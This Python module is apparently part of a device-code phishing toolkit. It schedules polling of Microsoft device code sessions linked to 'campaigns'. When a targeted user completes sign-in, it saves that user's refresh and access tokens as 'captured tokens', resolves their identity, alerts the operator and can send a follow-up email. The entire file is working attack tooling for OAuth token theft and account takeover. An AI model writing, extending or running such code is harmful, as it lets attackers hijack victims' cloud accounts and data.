"""Background scheduler to poll device code sessions for token capture."""
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime
from sqlalchemy.exc import InvalidRequestError
from sqlalchemy.orm.exc import ObjectDeletedError


def _session_has_refresh_token(session):
    """Return True if this session already has a usable captured refresh token."""
    try:
        token = session.captured_token
    except ObjectDeletedError:
        return False
    return bool(token and token.refresh_token)


def _repair_redeemed_error_sessions(db):
    """Fix sessions marked error after a successful capture (AADSTS54005 race)."""
    from app.models import DeviceCodeSession, CapturedToken
    from app.device_code import is_device_code_redeemed_error

    rows = (
        DeviceCodeSession.query.join(CapturedToken)
        .filter(
            DeviceCodeSession.status == "error",
            CapturedToken.refresh_token.isnot(None),
            CapturedToken.refresh_token != "",
        )
        .all()
    )
    repaired = False
    for session in rows:
        msg = (session.error_message or "").lower()
        if is_device_code_redeemed_error({"error_description": session.error_message}) or (
            "already redeemed" in msg or "54005" in msg
        ):
            session.status = "authorized"
            session.error_message = None
            session.device_code = None
            repaired = True
    if repaired:
        db.session.commit()


def poll_pending_sessions(app):
    """Poll all pending device code sessions and capture tokens when user completes auth."""
    with app.app_context():
        from app import db
        from app.models import DeviceCodeSession, CapturedToken
        from app.device_code import poll_for_tokens, is_device_code_redeemed_error
        from app.notification_sender import send_session_notification

        _repair_redeemed_error_sessions(db)

        pending = DeviceCodeSession.query.filter(
            DeviceCodeSession.status == "pending",
            DeviceCodeSession.expires_at > datetime.utcnow(),
            DeviceCodeSession.device_code.isnot(None),
            DeviceCodeSession.device_code != "",
        ).all()

        for session in pending:
            try:
                campaign = session.campaign
            except ObjectDeletedError:
                db.session.rollback()
                continue

            if _session_has_refresh_token(session):
                session.status = "authorized"
                session.error_message = None
                session.device_code = None
                db.session.commit()
                continue

            if not session.device_code:
                continue

            from app.services import get_effective_device_code_config, send_post_auth_email
            tenant_id, client_id = get_effective_device_code_config(campaign)

            success, data = poll_for_tokens(tenant_id, client_id, session.device_code)
            if success:
                old_status = session.status
                session.status = "authorized"
                session.error_message = None
                session.device_code = None

                token = session.captured_token
                if token is None:
                    token = CapturedToken(
                        session_id=session.id,
                        refresh_token=data.get("refresh_token", ""),
                        access_token=data.get("access_token"),
                        scope=data.get("scope"),
                    )
                    db.session.add(token)
                else:
                    token.refresh_token = data.get("refresh_token", token.refresh_token)
                    token.access_token = data.get("access_token") or token.access_token
                    token.scope = data.get("scope") or token.scope

                expires_in = data.get("expires_in")
                if expires_in:
                    from datetime import timedelta
                    token.access_token_expires_at = datetime.utcnow() + timedelta(seconds=expires_in)

                try:
                    from app.identity import resolve_identity_from_token_response, apply_auth_identity

                    identity = resolve_identity_from_token_response(data, tenant_id, client_id)
                    apply_auth_identity(session, token, identity)
                except Exception:
                    pass

                db.session.commit()
                send_session_notification(session, event="status_authorized", old_status=old_status)

                if campaign.send_post_auth_email and not session.post_auth_email_sent:
                    send_post_auth_email(session, token)
            else:
                err = data.get("error")
                try:
                    db.session.refresh(session)
                except (InvalidRequestError, ObjectDeletedError):
                    db.session.rollback()
                    continue

                if session.status != "pending":
                    continue

                if _session_has_refresh_token(session) or is_device_code_redeemed_error(data):
                    session.status = "authorized"
                    session.error_message = None
                    session.device_code = None
                    db.session.commit()
                    continue

                old_status = session.status
                if err == "expired_token":
                    session.status = "expired"
                    session.error_message = data.get("error_description") or "Device code expired (user did not sign in in time)."
                    db.session.commit()
                    send_session_notification(session, event="status_expired", old_status=old_status)
                elif err == "authorization_pending":
                    pass
                elif err == "slow_down":
                    pass
                elif err == "authorization_declined":
                    session.status = "declined"
                    session.error_message = data.get("error_description") or "User declined the sign-in request."
                    db.session.commit()
                    send_session_notification(session, event="status_declined", old_status=old_status)
                elif err in ("bad_verification_code", "invalid_grant") or is_device_code_redeemed_error(data):
                    session.status = "error"
                    session.error_message = (
                        data.get("error_description")
                        or "Device code was already used or is invalid. If the user completed sign-in, check Captured Tokens."
                    )
                    db.session.commit()
                    send_session_notification(session, event="status_error", old_status=old_status)
                else:
                    session.status = "error"
                    parts = []
                    if data.get("error_description"):
                        parts.append(data["error_description"])
                    if data.get("error"):
                        parts.append(f"error={data['error']}")
                    if data.get("error_codes"):
                        parts.append(f"error_codes={data['error_codes']}")
                    if data.get("status_code"):
                        parts.append(f"HTTP {data['status_code']}")
                    session.error_message = " | ".join(parts) if parts else str(data) or "Unknown error (no details from server)"
                    db.session.commit()
                    send_session_notification(session, event="status_error", old_status=old_status)


def init_scheduler(app):
    """Start background scheduler for device code polling."""
    interval = app.config.get("DEVICE_CODE_POLL_INTERVAL", 5)
    scheduler = BackgroundScheduler()
    scheduler.add_job(
        lambda: poll_pending_sessions(app),
        "interval",
        seconds=interval,
        id="device_code_poll",
        max_instances=1,
        coalesce=True,
    )
    scheduler.start()
    return scheduler
